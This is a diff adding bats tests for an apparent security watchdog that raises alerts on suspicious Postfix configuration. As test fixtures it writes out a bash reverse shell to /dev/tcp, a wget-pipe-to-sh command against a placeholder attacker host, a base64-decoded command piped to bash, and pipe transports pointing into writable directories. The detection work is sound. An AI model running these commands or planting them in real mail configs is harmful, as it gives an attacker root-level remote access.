@@ -166,3 +166,61 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — postfix inventory enumerates mail-trigger root-exec surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (argv under /var/tmp): writable-root expansion" {
+    seed_benign
+    run_wd
+    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/var/tmp/.x\n' > "${MASTER}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (argv under /home): user-writable hijack coverage" {
+    seed_benign
+    run_wd
+    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/home/user/.x\n' > "${MASTER}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (reverse-shell pattern in mailbox_command)" {
+    seed_benign
+    run_wd
+    printf 'mailbox_command = bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${MAIN}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in mailbox_command)" {
+    seed_benign
+    run_wd
+    printf 'mailbox_command = wget -qO- http://attacker/p | sh\n' > "${MAIN}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in mailbox_command)" {
+    seed_benign
+    run_wd
+    printf 'mailbox_command = echo YmFzaCAtaQ== | base64 -d | bash\n' > "${MAIN}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-postfix-exec -- ')
+    [ "${main_count}" = "1" ]
+}
